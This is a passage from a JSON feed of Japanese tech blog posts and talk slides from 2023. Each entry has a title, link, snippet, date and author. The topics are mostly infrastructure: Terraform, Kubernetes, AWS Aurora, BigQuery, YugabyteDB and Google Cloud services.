に参加して、LTしてきました。kichijojipm.connpass.com資料はこちら。言いたいこととしてはベストプラクティスなんてないよ。一般的によりよいプラクティスやパターンはあるけど、どんなときには適用できる銀の弾丸的なものはないから、自身の組織とサービスに合わせてくみ上げていきましょうということ。正解はひとつ!じゃない!!その上で、ざっくりとどんな選択肢と選択するための観点を述べていきました。まだ全然ブラッシュアップできるのでどこかでまとめてブログに書きたいところです。ちなみに最後に出てくる あなたらしく○○ は同僚のスライドのパロディです。毎回時間オーバーするのでトークで申し込んだ方が良いのでは?というツッコミはごもっともです。懇親会でもTerraformのお悩みとか短いですが話せて楽しかったです。また参加したいですね。","isoDate":"2023-12-03T07:17:54.000Z","dateMiliSeconds":1701587874000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Auroraアップグレード時のBlue/Green Deploymentsの利用","link":"https://zenn.dev/hakushou41/articles/70b83066cd1741","contentSnippet":"このエントリーは3-shake Advent Calendar 2023 4日目の記事です。株式会社スリーシェイクのメンバーが各々自由に技術・非技術ネタを投稿するカレンダーとなります。 はじめにAmazon Aurora2系について、標準サポート終了日(2024/10/31)まで1年を切りました。依然として、Aurora2系を利用しているシステムは多いのではないでしょうか。アプリケーションのテストや検証を考えると早めに動いていかなければならない時期となりました。本記事では、アップグレード方式・方針の一つとして、AWSからも推奨されているRDS Blue/Green Deplo...","isoDate":"2023-12-03T07:12:32.000Z","dateMiliSeconds":1701587552000,"authorName":"Shohei Takamura","authorId":"stakamura"},{"title":"Playwright Test generatorを利用したE2Eテスト ことはじめ","link":"https://zenn.dev/hakushou41/articles/65bc815b14354f","contentSnippet":"このエントリーは3-shake Advent Calendar 2023 3日目の記事です。株式会社スリーシェイクのメンバーが各々自由に技術・非技術ネタを投稿するカレンダーとなります。 はじめに現在、私はマイクロサービスを運用するSREを支援する人として活動しています。運用チームやSREが主導となって実施するメンテナンスやアップデート作業などでは、アップデート後の動作確認として、ブラウザを介したWebアプリケーションの簡易目視確認をします。これらの確認項目は、手順書へ項目を記載し、必要に応じてエビデンスをスクリーンショットで取得する必要があります。確認作業を網羅的にしようとす...","isoDate":"2023-12-02T15:00:00.000Z","dateMiliSeconds":1701529200000,"authorName":"Shohei Takamura","authorId":"stakamura"},{"title":"2023-12-01 吉祥寺.pm ベストプラクティスと組織とIaC","link":"https://speakerdeck.com/masasuzu/2022-12-01-ji-xiang-si-dot-pm","contentSnippet":"ベストプラクティスなんてものはない","isoDate":"2023-12-01T05:00:00.000Z","dateMiliSeconds":1701406800000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"データベースエンジニアのためのDB on Kubernetes入門ガイド","link":"https://zenn.dev/nnaka2992/articles/db_on_k8s_guide_for_db_engineers","contentSnippet":"このエントリーは3-shake Advent Calendar 2023 1日目の記事です。株式会社スリーシェイクのメンバーが各々自由に技術・非技術ネタを投稿するカレンダーとなります。 はじめに1959年にW. C. McGeeがデータベースという概念を提唱してから約65年、様々なアーキテクチャのデータベースが提案され様々なプラットフォームで利用されてきました。古くはメインフレームを中心に動作していたデータベースは、マイコンブームとともにそのアーキテクチャを変えながらにオープン系システムへと主戦場を移して行きました。オープン系が主流になってからもその進化は止まることなく、ベア...","isoDate":"2023-11-30T23:30:01.000Z","dateMiliSeconds":1701387001000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"KEP-4188: New kubelet gRPC API with endpoint returning local pods info","link":"https://zenn.dev/toversus/articles/791c7916e21059","contentSnippet":"!KEP 持ち寄り会 #1 の登壇資料です。2023/11/27 時点の KEP-4188 の内容です。Kubernetes 1.29 時点で機能として入っていないので注意して下さい。また、後半の文章は考察を含んでおり、正確な情報でない可能性があります。 概要KEP-4188 は、Kubelet に Pod Conditions を公開する gRPC API を追加する KEP です。Pod Conditions は Status フィールドに含まれています。❯ kubectl get pods -n kube-system coredns-5d78c9869d-8gglh ...","isoDate":"2023-11-27T08:23:13.000Z","dateMiliSeconds":1701073393000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"KEP-3063: Dynamic resource allocation","link":"https://speakerdeck.com/bells17/kep-3063-dynamic-resource-allocation","contentSnippet":"KEP持ち寄り会で発表した資料です。\\rKubernetesのKEP \\"Dynamic resource allocation\\" に関する情報をまとめた内容になります。\\r\\rイベントURL: https://kep.connpass.com/event/299651/\\r参考資料:\\r\\rhttps://zenn.dev/toversus/articles/fe2aa06f133b49 \\rhttps://kubernetes.io/blog/2022/12/15/dynamic-resource-allocation/ \\rhttps://github.com/kubernetes/enhancements/blob/master/keps/sig-node/3063-dynamic-resource-allocation/README.md \\rhttps://github.com/kubernetes-sigs/dra-example-driver/blob/main/demo/demo-apps.png \\rhttps://github.com/kubernetes/enhancements/blob/master/keps/sig-node/3063-dynamic-resource-allocation/components.png \\rhttps://github.com/cncf-tags/container-device-interface \\rhttps://github.com/containerd/containerd/blob/v1.7.9/pkg/cri/server/container_create_linux.go#L417-L419 \\rhttps://github.com/cncf-tags/container-device-interface/blob/main/pkg/cdi/container-edits.go#L70-L148 \\rhttps://github.com/kubernetes/enhancements/blob/master/keps/sig-node/3063-dynamic-resource-allocation/README.md \\rhttps://github.com/kubernetes/kubernetes/pull/111023 \\rhttps://github.com/orgs/kubernetes/projects/95/views/1 \\rhttps://github.com/kubernetes/dynamic-resource-allocation \\rhttps://www.cncf.io/projects/akri/ \\rhttps://github.com/kubernetes-sigs/dra-example-driver \\rhttps://github.com/NVIDIA/k8s-dra-driver \\rhttps://github.com/intel/intel-resource-drivers-for-kubernetes \\rhttps://github.com/intel/intel-device-plugins-for-kubernetes \\rhttps://docs.google.com/document/d/1BNWqgx_SmZDi-va_V31v3DnuVwYnF2EmN7D-O_fB6Oo/edit#heading=h.bxuci8gx6hna \\rhttps://drive.google.com/file/d/1iLg2FEAEilb1dcI27TnB19VYtbcvgKhS/view\\rhttps://developer.nvidia.com/blog/nvidia-gpu-operator-simplifying-gpu-management-in-kubernetes/ \\rhttps://docs.nvidia.com/datacenter/cloud-native/gpu-operator/latest/overview.html \\rhttps://docs.nvidia.com/datacenter/cloud-native/gpu-operator/latest/cdi.html \\rhttps://intel.github.io/intel-device-plugins-for-kubernetes/README.html \\rhttps://github.com/NVIDIA/k8s-device-plugin\\rhttps://blogs.nvidia.com/blog/multi-instance-gpus/ \\rhttps://developer.nvidia.com/blog/nvidia-ampere-architecture-in-depth/ \\rhttps://groups.google.com/a/kubernetes.io/g/dev/c/BDtCFfXQbw0?pli=1\\rhttps://kubernetes.slack.com/archives/C032ZE66A2X/p1700215190429689 \\rhttps://kubernetes.slack.com/archives/C032ZE66A2X/p1700215190429689","isoDate":"2023-11-27T05:00:00.000Z","dateMiliSeconds":1701061200000,"authorName":"bells17","authorId":"bells17"},{"title":"BigQueryの メタデータってどこから見れるの？","link":"https://zenn.dev/nedoko_dok0dko/articles/f6ccafeceac4a3","contentSnippet":"whatBigQueryのメタデータの取得先について簡単にまとめたもの BigQueryのメタデータ、調べることが出来るの?A. 出来るということで、メタデータの主な取得先について記載していく テーブル情報やレコード数BigQueryにはINFORMATION_SCHEMAという、メタデータなどを保持しているビューが存在している。これらを利用してメタデータを取得することが出来る。ただし、テーブルの更新日やテーブルのデータ量については記録されていない。https://cloud.google.com/bigquery/docs/information-sche...","isoDate":"2023-11-21T10:26:24.000Z","dateMiliSeconds":1700562384000,"authorName":"seno","authorId":"seno"},{"title":"ツールごとのOPA/Regoの書き方","link":"https://zenn.dev/tayusa/articles/63f286f4733a87","contentSnippet":"RegoとはKubernetesやTerraformの静的解析で既存のルールでは足りないときや自分でカスタマイズしたいときにRegoというポリシー言語でコードを書くhttps://www.openpolicyagent.org/docs/latest/policy-language/ Regoを利用できるツールの例conftesthttps://www.conftest.dev/自分で全部書くtrivyhttps://aquasecurity.github.io/trivy/latest/docs/scanner/misconfiguration/cust...","isoDate":"2023-11-16T03:05:53.000Z","dateMiliSeconds":1700103953000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"MinIO Client で Amazon S3 や Cloudflare R2 を利用する","link":"https://blog.1q77.com/2023/11/minio-client/","contentSnippet":"Cloudflare R2 は egress の費用がかからないということで手元のファイルのバックアップに使ってみようかなと思ったときにクライアントとして何を使おうかな aws cli 使うほどじゃないしなということで MinIO Client (mc) を使ってみたメモ。","isoDate":"2023-11-12T11:13:31.000Z","dateMiliSeconds":1699787611000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"kube-proxy入門","link":"https://speakerdeck.com/bells17/kube-proxyru-men","contentSnippet":"Kubernetes Novice Tokyo #28 の登壇資料です\\r\\rイベントURL: https://k8s-novice-jp.connpass.com/event/293157/\\r配信URL: https://www.youtube.com/watch?v=LSW51Cm0Wc0\\r\\rコードリーディングメモ:\\rhttps://zenn.dev/bells17/scraps/5e41da598a8266\\r\\r参考資料:\\rhttps://github.com/kubernetes/kubernetes/tree/v1.28.2 \\rhttps://speakerdeck.com/ryusa/servicewotazunete3000xing-kuberneteskodorideingufalselu \\rhttps://qiita.com/Tocyuki/items/6d90a1ec4dd8e991a1ce \\rhttps://oxynotes.com/?p=6361#5 \\rhttps://atmarkit.itmedia.co.jp/ait/articles/1002/09/news119.html \\rhttps://hana-shin.hatenablog.com/entry/2022/06/21/215757 \\rhttps://qiita.com/syui/items/27020b970775a0c508ba \\rhttps://www.digitalocean.com/community/tutorials/iptables-essentials-common-firewall-rules-and-commands \\rhttps://www.asahi-net.or.jp/~aa4t-nngk/ipttut/output/explicitmatches.html \\rhttps://github.com/torvalds/linux/blob/master/Documentation/networking/nf_conntrack-sysctl.rst \\rhttps://tech-blog.rakus.co.jp/entry/20220301/iptables \\rhttps://linuxjm.osdn.jp/html/iptables/man8/iptables-extensions.8.html \\rhttps://man.archlinux.org/man/conntrack.8.en \\rhttps://nomeu.net/8380/ \\rhttps://knowledge.sakura.ad.jp/4048/ \\rhttps://docs.openshift.com/container-platform/4.10/rest_api/network_apis/service-v1.html \\rhttps://stackoverflow.com/questions/75835169/kubernetes-loadbalancer-how-does-healthchecknodeport-work \\rhttps://kubernetes.io/docs/tasks/access-application-cluster/create-external-load-balancer/#preserving-the-client-source-ip \\rhttps://kubernetes.io/docs/concepts/services-networking/service-traffic-policy/ \\rhttps://kubernetes.io/docs/tasks/access-application-cluster/create-external-load-balancer/ \\rhttps://hyoublog.com/2020/05/20/kubernetes-externalip-service/ \\rhttps://qiita.com/dingtianhongjie/items/8f3c320c4eb5cf25d9de \\rhttps://milestone-of-se.nesuke.com/nw-basic/as-nw-engineer/loopback-address-interface/ \\rhttps://kubernetes.io/docs/reference/networking/virtual-ips/ \\rhttps://kubernetes.io/docs/concepts/services-networking/service/ \\rhttps://kubernetes.io/ja/docs/concepts/services-networking/connect-applications-service/ \\rhttps://knowledge.sakura.ad.jp/22636/ \\rhttps://netfilter.org/index.html \\rhttps://madomadox.hatenablog.com/entry/2021/01/03/190730 \\rhttps://qiita.com/bashaway/items/e405d59d92670fbc5341 \\rhttps://www.digitalocean.com/community/tutorials/a-deep-dive-into-iptables-and-netfilter-architecture \\rhttps://tech-blog.rakus.co.jp/entry/20220301/iptables \\rhttps://www.asahi-net.or.jp/~aa4t-nngk/ipttut/output/explicitmatches.html \\rhttps://eng-entrance.com/linux-firewall \\r\\r\\r画像引用元:\\rhttps://github.com/kubernetes/community/tree/master/icons \\rhttps://github.com/kubernetes/kubernetes/tree/master/logo \\rhttps://github.com/cncf/artwork/tree/master/projects/kubernetes \\rhttps://github.com/kubernetes/kubeadm/tree/main/logos","isoDate":"2023-11-09T05:00:00.000Z","dateMiliSeconds":1699506000000,"authorName":"bells17","authorId":"bells17"},{"title":"Amazon ECSイベントをCloudWatch Logsへ収集する","link":"https://zenn.dev/yuu0w0yuu/articles/df3a9fdef609e2","contentSnippet":"この記事は、3-shake Advent Calendar 2023 1日目のエントリ記事です。 きっかけECSは、Container Insightsを有効化することでクラスタやサービスといった各レイヤのパフォーマンスメトリクスをCloudWatchに収集できる。一方で、以下のようなケースにおいて一定の仮説を導くためには、このメトリクスだけではやや不足感があるため、発生したイベントやその結果を別の方式で監視したくなった。メトリクスがスパイクしたタイミングで何が起きていたか？デプロイを実行したが結果はどうだったか？デプロイが失敗したが原因は何か？などなど・・調べてみ...","isoDate":"2023-11-02T08:33:22.000Z","dateMiliSeconds":1698914002000,"authorName":"Yutaro Shirayama","authorId":"yuu0w0yuu"},{"title":"【Terraform\uD83E\uDDD1\uD83C\uDFFB‍\uD83D\uDE80】\\"Findy Terraform 活用大全 - IaCの今\\" に登壇","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/10/25/550144","contentSnippet":"発表スライドから得られる知識発表スライドを見ると、以下を \\"完全に理解\\" できます✌️Terraformのtfstateの分割パターンtfstate分割をリポジトリやリモートバックエンドのディレクトリ構成への適用する方法発表スライドから得られる知識イベント名発表スライドイベント名オッス！オラ長谷川！✋\uD83C\uDFFB『 tfstate の分割パターンとディレクトリ構成への適用』ていうテーマで、 Findy Terraform 活用大全 - IaCの今 に登壇したぞ！発表スライドみんな！スライドぜってぇ見てくれよな！『Terraform活用大全 - IaCの今。』の登壇資料です!!tfstateを分割してみんなで最高になろう✌\uD83C\uDFFB#Terraform_findyhttps://t.co/NteGvKdMEE— 長谷川 広樹 (地下強制労働者) (@Hiroki__IT) October 25, 2023 ちな、発表内容の詳細はこの記事をみてくれよな！","isoDate":"2023-10-25T03:00:00.000Z","dateMiliSeconds":1698202800000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"\uD83E\uDDD1‍\uD83D\uDE80 tfstate の分割パターンとディレクトリ構成への適用","link":"https://speakerdeck.com/hiroki_hasegawa/tfstate-nofen-ge-hatantoteirekutorigou-cheng-henoshi-yong","contentSnippet":"『Terraform活用大全 - IaCの今』の登壇資料です\\r\\r\\r・Terraformのtfstateの分割パターン\\r・tfstate分割をリポジトリやリモートバックエンドのディレクトリ構成への適用する方法\\r\\rを紹介しました\\r\\rスライドでは少ししか分割パターンを紹介できませんでしたので、ぜひ元記事 (tfstateファイルの分割パターンとディレクトリ構成への適用) もご参照ください\uD83D\uDC4D\uD83C\uDFFB\\r\\r\uD83D\uDC26 ツイート：https://x.com/Hiroki__IT/status/1717030862452384047","isoDate":"2023-10-24T04:00:00.000Z","dateMiliSeconds":1698120000000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"YugabyteDBのドキュメントを全部読む Day9","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/9_core_functions_high_availability","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Core functions > Read I/O pathを読みました。今回はArchitecture > Core functions > High Availabilityを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。High availabilityYugabyteDBは一貫性と分断耐性を兼ね備えたデータベースであると同時にリーダーの障害時に新しいリーダーとしてフェイルオーバー出来るアクティブレプリカを持つことで高可用性(HA)を達成している。もしノードに障害が発生した場合、そのノード上で動作するYB-TServerとYB-Masterの停止を引き起こす。YB-TServer failureYB-TServerはYSQLレイヤとアクティブなIOを提供するピアーリーダータブレットを含むタブレットをホストする。YSQレイヤとタブレットピアーフォロワーとタブレットピアーリーダーで発生した障害はそれぞれ特別な方法であつかわれる。YQL failureアプリケーションの視点からみればYQLはステートレスである。そのためクライアントが発行したリクエストは単純に他ノードのYQLにリクエストが送信される。スマートクライアントを利用している場合、スマートクライアントは理想的なYB-TServerの場所をタブレットが所有するキーから検索し、リクエストを直接そのノードに転送する。Tablet peer follower failureタブレットピアーフォロワーはクリティカルパスではない。この障害はユーザーリクエストへの可用性に影響しない。Tablet peer leader failureタブレットピアーリーダーの障害は数秒以内にRaftレベルのリーダー選出を自動的にトリガーし、他のYB-TServerに配置されているタブレットピアーが新しいリーダーとして選出される。タブレットピアリーダーに障害が発生した場合、可用性が損なわている時間は約3秒(ハードビートの感覚がデフォルトの500msの場合)である。YB-Master failureYB-Masterは通常のIOオペレーションではクリティカルパスでは無いため、ユニバースを動作させるのに影響は無い。しかしYB-Masterは異るノードで動作するピアーのRaftグループの一部であるため。このピアーのうちの一つがアクティブなマスターで残りがアクティブスタンバイである。YB-Masterのリーダーであるアクティブマスターに障害が発生した場合、ピアーはリーダーの障害を検知し、新なアクティブマスターであるYB-Masterのリーダーを障害時に数秒以内で再選出する。","isoDate":"2023-10-21T15:12:37.000Z","dateMiliSeconds":1697901157000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Google Application Integrationについて","link":"https://zenn.dev/nedoko_dok0dko/articles/365af68bb280e7","contentSnippet":"whatGoogle Cloudの「Application Integration」というサービスについて軽く調べたことをまとめたログ関連してiPaasについても調べたことを記載する Application Integrationとはhttps://cloud.google.com/application-integration?hl=jaGoogle Cloudが提供するIntegration Platform as a Service（iPaaS）ソリューションビジュアルエディタを利用することによって、以下がノーコードで行えるイベントによるトリガーの...","isoDate":"2023-10-18T09:20:05.000Z","dateMiliSeconds":1697620805000,"authorName":"seno","authorId":"seno"},{"title":"コンテナ \xd7 セキュリティ \xd7 AWS","link":"https://speakerdeck.com/kyohmizu/kontena-x-sekiyuritei-x-aws","contentSnippet":"「JAWS-UG コンテナ支部 \xd7 JAWS-UG 千葉支部 #1 今知りたいコンテナセキュリティ」の資料です。\\rhttps://jawsug-container.connpass.com/event/295110/","isoDate":"2023-10-16T04:00:00.000Z","dateMiliSeconds":1697428800000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Cloud Asset Inventoryとは","link":"https://zenn.dev/nedoko_dok0dko/articles/e80d73d4f28a79","contentSnippet":"whatGoogle Cloud のCloud Asset Inventoryについて調べてわかったことの個人まとめ Cloud Asset Inventoryとはhttps://cloud.google.com/asset-inventory/docs/overview?hl=jaCloud Asset Inventory は、時系列データベースに基づいてインベントリ サービスを提供します。このデータベースは、Google Cloud のアセット メタデータの 35 日間分の履歴を保持します。過去 35 日間変更がない既存のアセットの場合、Cloud Asset ...","isoDate":"2023-10-13T10:27:12.000Z","dateMiliSeconds":1697192832000,"authorName":"seno","authorId":"seno"},{"title":"kube-controller-manager入門","link":"https://speakerdeck.com/bells17/kube-controller-managerru-men","contentSnippet":"SRETT #7 で発表した資料です。\\rhttps://3-shake.connpass.com/event/293432/\\r\\r発表のライブ配信はこちら。\\rhttps://www.youtube.com/watch?v=h1VxlvF9bls\\r\\rzennのスクラップ:\\rhttps://zenn.dev/bells17/scraps/592a02b3bc1ff3\\r\\rスライドで紹介した参考リンク集:\\r- https://github.com/kubernetes/kubernetes/tree/v1.28.2","isoDate":"2023-10-12T04:00:00.000Z","dateMiliSeconds":1697083200000,"authorName":"bells17","authorId":"bells17"},{"title":"DietPi で DNLA サーバー","link":"https://blog.1q77.com/2023/09/minidlna-on-dietpi/","contentSnippet":"Raspberry Pi 4 を買った週に Raspberry Pi 5 が発表されてちょっと悔しいところですが Windows XP 時代から OS を更新しながら使っていた古いデスクトップPCを処分したのでそこで使っていた HDD をラズパイにつないで Samba で NAS としてアクセス可能にしてみました。そこには昔ハンディカムで撮影した動画なんかも沢山保存されていたのでテレビでそれを見れるように DLNA のメディアサーバーすることにしました。","isoDate":"2023-09-30T08:33:09.000Z","dateMiliSeconds":1696062789000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"EventBridge Scheduler からの Lambda 関数起動に Lambda Permission は不要","link":"https://zenn.dev/toshikish/articles/743f69389aa99c","contentSnippet":"AWS Lambda 関数の他サービスからの呼び出しAWS Lambda 関数にはリソースベースポリシーを割り当てることができます。関数を他のサービスから呼び出すとき，通常はリソースベースポリシーにそのサービスからの実行を許可するポリシーを追加する必要があります。例えば，Amazon SNS からイベント駆動で呼び出す場合は，以下のように add-permission コマンドを実行することでポリシーを追加することができます。aws lambda add-permission --function-name example-function \\\\--action lambda...","isoDate":"2023-09-22T10:16:34.000Z","dateMiliSeconds":1695377794000,"authorName":"toshikish","authorId":"toshikish"},{"title":"WSL 2 で外部ストレージをマウント","link":"https://blog.1q77.com/2023/09/wsl2-mount-volume/","contentSnippet":"Laptop を Linux で使用していた時の遺産を WSL 環境でも使おうと XFS でフォーマットされた USB 接続の HDD をマウントする方法がないかなと思って調べたメモ。Microsoft のドキュメントにありました。","isoDate":"2023-09-21T14:08:28.000Z","dateMiliSeconds":1695305308000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"IPA試験 合格体験記/qualification-story","link":"https://speakerdeck.com/moz_sec_/qualification-story","contentSnippet":"","isoDate":"2023-09-15T04:00:00.000Z","dateMiliSeconds":1694750400000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"BigQueryの行列レベルのアクセス制御について","link":"https://zenn.dev/nedoko_dok0dko/articles/bc6a413eb623c7","contentSnippet":"whatBigQueryにおける「行列レベル」のアクセス制御について調べたことをまとめる そもそも: 行・列単位に対してのアクセス制御は可能なのか?A. できるそれぞれ記載していく 列単位https://cloud.google.com/bigquery/docs/column-level-security-intro?hl=ja列に対して事前定義したポリシータグと呼ばれるものを付与することで、特定のアカウントやグループだけが列にアクセスできる。アクセスポリシーはSQLを実行する際に確認され、許可されていないメンバーからのクエリはAccess Denitedと...","isoDate":"2023-09-14T11:46:25.000Z","dateMiliSeconds":1694691985000,"authorName":"seno","authorId":"seno"},{"title":"Cloud Deployを使ったCloud Runのリリース","link":"https://zenn.dev/satohjohn/articles/7e6a70edc8f36e","contentSnippet":"概要Cloud RunのリリースにCloud Deployを使ってみます。 そもそもCloud Deployとはhttps://cloud.google.com/deploy?hl=jaGKE、Cloud Runのリリースを管理できるサービスになります。リリースフローを記載したパイプラインの定義を作成し、パイプラインを作成したら、フローを管理できるようになります。各フローでは基本内部でskaffoldを通して、Cloud Buildが実行される形です。Cloud Deployを使うと以下のような、リリースフローになるかと思います。Cloud BuildでImageを...","isoDate":"2023-09-13T05:47:13.000Z","dateMiliSeconds":1694584033000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Kubernetesソースコードリーディング入門","link":"https://speakerdeck.com/bells17/kubernetessosukotoriteinkuru-men","contentSnippet":"Kubernetes Novice Tokyo #27 で発表した資料です。\\rhttps://k8s-novice-jp.connpass.com/event/293144/\\r\\r発表のライブ配信はこちら。\\rTODO\\r\\rスライドで紹介した参考リンク集:\\rhttps://bells17.medium.com/things-you-should-know-about-reading-kubernetes-codes-933b0ee6181d \\rhttps://www.amazon.co.jp/dp/4297104385/\\rhttps://www.amazon.co.jp/dp/4297118378/ \\rhttps://go.dev/tour/welcome/1 \\rhttps://gopherdojo.org/studyroom/ \\rhttps://www.amazon.co.jp/dp/4621300253/ \\rhttps://speakerdeck.com/bells17/kubelet-and-containers \\rhttps://speakerdeck.com/ryusa/servicewotazunete3000xing-kuberneteskodorideingufalselu \\rhttps://speakerdeck.com/bells17/kube-api-server-k8sjp \\rhttps://speakerdeck.com/sanposhiho/zi-zuo-sitexue-bukubernetes-schedulerru-men \\rhttps://speakerdeck.com/bells17/cloud-controller-manager-deep-dive \\rhttps://speakerdeck.com/masayaaoyama/infrastudy2-k8s \\rhttps://github.com/kubernetes/client-go/tree/master/examples/workqueue \\rhttps://github.com/kubernetes/sample-controller/blob/master/controller.go \\rhttps://github.com/kubernetes-sigs/kubebuilder \\rhttps://speakerdeck.com/bells17/kubebuilder-introduction \\rhttps://zoetrope.github.io/kubebuilder-training/ \\rhttps://github.com/cybozu-go \\rhttps://www.youtube.com/watch?v=yqB_le-N6EE \\rhttps://github.com/kubernetes/enhancements/blob/master/keps/sig-instrumentation/1602-structured-logging/README.md \\rhttps://github.com/kubernetes/enhancements/issues/1602 \\rhttps://github.com/kubernetes/klog/issues/125 \\rhttps://github.com/kubernetes/klog/pull/126 \\rhttps://github.com/kubernetes-csi \\rhttps://kubernetes-csi.github.io/docs/drivers.html \\rhttps://speakerdeck.com/bells17/introduction-to-csi \\rhttps://github.com/kubernetes/kubeadm \\rhttps://speakerdeck.com/bells17/implementation-of-kubeadm-init \\rhttps://github.com/kubernetes-sigs/metrics-server \\rhttps://speakerdeck.com/bells17/metrics-server \\rhttps://speakerdeck.com/bells17/accurate-introduction \\rhttps://github.com/cybozu-go/accurate \\rhttps://slack.k8s.io/ \\rhttps://www.youtube.com/watch?v=Ayo5w-CSmP0 \\rhttps://github.com/kubernetes/community","isoDate":"2023-09-12T04:00:00.000Z","dateMiliSeconds":1694491200000,"authorName":"bells17","authorId":"bells17"},{"title":"GitHub ActionsでWorkload Identityでの認証を入れてGoogle CloudのAPIを叩く","link":"https://zenn.dev/satohjohn/articles/1645be8e83eab6","contentSnippet":"概要正直難しいと思ってたのですが、資料を読んでいくと表面上、実装は難しくありませんでした。GitHub ActionsとGoogle Cloudを連携する場合、json管理とかしなくても済むし、基本的にやっておいて損はないと思います。ユースケースとしては、例えば、GitHub Actionsで実行した結果(report)をGoogle Cloud Storageにデータを送りたいなどの際に使えると思います。Identity Poolに対して、providerは複数作成できるため、いろんな GitHub Actionsから利用されるようなパターンでも、provider:scri...","isoDate":"2023-09-11T14:17:35.000Z","dateMiliSeconds":1694441855000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"BigQueryのオンデマンド料金におけるコスト管理方法についてメモ","link":"https://zenn.dev/nedoko_dok0dko/articles/f0da04c4a70ea6","contentSnippet":"whatBigQueryにおけるコスト管理方法について、公式ドキュメントを元にメモしたログ今回はオンデマンド料金について記載のため、定額料金(BigQuery Editions)に関しては記載しない 高額請求が来てしまうパターンとはよく見かける/耳にするのは以下のような場合(あくまで一例)大量にデータをスキャンするクエリを実行するselect * 系のクエリを投げる(Table Patitionを利用したテーブルの場合)partitionで指定しないでクエリを投げる料金がかかるクエリをバッチなど利用して連続で実行してしまうTable Patition...","isoDate":"2023-09-11T01:56:24.000Z","dateMiliSeconds":1694397384000,"authorName":"seno","authorId":"seno"},{"title":"YugabyteDBのドキュメントを全部読む Day8","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/8_core_functions_read_io_path","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Core functions > Write I/O pathを読みました。今回はArchitecture > Core functions > Read I/O pathを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。Read I/O pathI/O Pathはタブレットリーダーが特定されリード処理を実行する単一キーの例で説明することが出来る。Tablet leader identificationユーザーが発行したYQLクエリレイヤに作用するリードリクエストはポートから適切なAPI(YQLまたはYCQL)を経由して行なわれる。このユーザリクエストはYQLレイヤで内部キーに変換され、YQLレイヤがタブレットとそれをホストするYB-TServerを発見するのに利用される。YQLレイヤはこれをYB-MasterにたしてRPC呼び出しを実行するために行なう。またそのレスポンスは将来の利用のためにキャッシュされる。その後YQLレイヤはリーダータブレットピアーをホストするYB-TServerに対してリード処理を行なう。このリード処理は内部キーを保持するタブレットのRaftグループのリーダーによって処理される。このリードリクエストを処理するRaftグループのリーダーはDocDBから読み込みを実行し、その結果をユーザーに戻す。Write I/O Pathで説明した通り、YugabyteDBのスマートクライアントではアプリケーションのリクエストを直接適切なYB-TServerに送信することが出来るため、余計なネットワークホップやマスターへのアクセスを省略することが出来る。Read operation performed by tablet leaderkという値をKというプライマリキー行に持つテーブルT1からデータを取得するケースについて考える。またテーブルT1はキー行Kと値行Vを持つものとする。1下記の画像はリード処理について説明している。YugabyteDBはデフォルトでは強整合性の読み取りを採用している。リードクエリはさらに複雑になることもある。YQLクエリレイヤーは式やビルトイン関数、算術演算を含むクエリを処理するfully-optimized2されたクエリエンジンを持っている。SELECT K,V from T1 where K = \'k\'ということ↩↩","isoDate":"2023-09-06T18:37:55.000Z","dateMiliSeconds":1694025475000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"LookMLとは","link":"https://zenn.dev/nedoko_dok0dko/articles/18a4a04b98dcb8","contentSnippet":"これは何？Looker内にある機能である「LookML」について調べたことをまとめた個人的備忘録。 LookMLとはLookMLの紹介 \xa0|\xa0 Looker \xa0|\xa0 Google CloudLookML は、Looker Modeling Language の略です。セマンティックデータモデルを作成するためにLookerで使用される言語です。LookMLを使用して、SQLデータベース内のディメンション、集計、計算、およびデータの関係を記述できます。LookMLは「Looker上で利用できる独自の言語」のことをさす　別にMLや機械学習は関係ないLookerは、Lo...","isoDate":"2023-09-05T10:46:35.000Z","dateMiliSeconds":1693910795000,"authorName":"seno","authorId":"seno"},{"title":"Nodejs(Nest.js)のアプリケーションのbuildを高速化、slim化してみようの会","link":"https://zenn.dev/satohjohn/articles/c05d29f5d68e0c","contentSnippet":"前提DockerによるNode.jsのインストール(pull)はキャッシュされているものとする.dockerignoreは以下の通りnode_modules.git.gitignore*.mddisttest 最初にまとめ軽く、そんなに依存関係が多くないアプリケーションであればnpmでstaging buildでキャッシュ効かせるぐらいでよいかもRUN --mount=type=cache,target= は効果がありそうである (https://zenn.dev/kou64yama/articles/powerful-docker-build-cache...","isoDate":"2023-09-02T10:02:16.000Z","dateMiliSeconds":1693648936000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Lookerのユーザー権限について","link":"https://zenn.dev/nedoko_dok0dko/articles/160cb146e72740","contentSnippet":"これは何Lookerのユーザー権限一覧を個人的にまとめたものhttps://cloud.google.com/looker/docs/admin-panel-users-roles?hl=ja#default_permission_sets ユーザー権限一覧Admin:Developer、Viewer、Standard権限に加え、データソースへの接続やユーザー管理の権限を持つ現時点で確認できる、Adminでしかできない機能については以下データソース(BigQuery等)への接続設定ユーザーの追加・削除・権限の変更ユーザー・グループ単位のフォルダの公開・非公...","isoDate":"2023-08-31T17:22:40.000Z","dateMiliSeconds":1693502560000,"authorName":"seno","authorId":"seno"},{"title":"YugabyteDBのドキュメントを全部読む 